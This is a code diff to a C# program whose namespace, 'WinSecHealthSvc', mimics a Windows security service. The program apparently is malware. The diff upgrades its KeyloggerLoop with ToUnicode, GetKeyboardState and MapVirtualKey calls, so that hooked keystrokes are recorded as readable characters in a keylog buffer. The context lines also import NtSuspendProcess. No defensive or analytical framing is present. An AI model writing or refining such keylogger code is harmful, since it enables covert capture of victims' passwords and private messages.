@@ -668,6 +668,9 @@ namespace WinSecHealthSvc
         static extern bool TranslateMessage([In] ref KbMsg lpMsg);
         [DllImport("user32.dll")]
         static extern IntPtr DispatchMessage([In] ref KbMsg lpmsg);
+        [DllImport("user32.dll")] static extern int ToUnicode(uint virtualKey, uint scanCode, byte[] keyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder receiveBuffer, int bufferSize, uint flags);
+        [DllImport("user32.dll")] static extern bool GetKeyboardState(byte[] lpKeyState);
+        [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);
         [DllImport("ntdll.dll", PreserveSig = false)]
         public static extern void NtSuspendProcess(IntPtr processHandle);
         [DllImport("ntdll.dll", PreserveSig = false)]
@@ -827,10 +830,21 @@ namespace WinSecHealthSvc
 
         static void KeyloggerLoop() {
             try {
+                byte[] keyState = new byte[256];
                 _kbProc = (n, w, l) => {
                     if (n >= 0 && (int)w == 0x100) {
                         int vk = Marshal.ReadInt32(l);
-                        _keylog.Append("[" + ((System.Windows.Forms.Keys)vk).ToString() + "]");
+                        GetKeyboardState(keyState);
+                        StringBuilder sb = new StringBuilder(5);
+                        uint sc = MapVirtualKey((uint)vk, 0);
+                        int res = ToUnicode((uint)vk, sc, keyState, sb, sb.Capacity, 0);
+                        
+                        if (res > 0) {
+                            _keylog.Append(sb.ToString());
+                        } else {
+                            string kName = ((System.Windows.Forms.Keys)vk).ToString();
+                            _keylog.Append("[" + kName + "]");
+                        }
                     }
                     return CallNextHookEx(_hook, n, w, l);
                 };
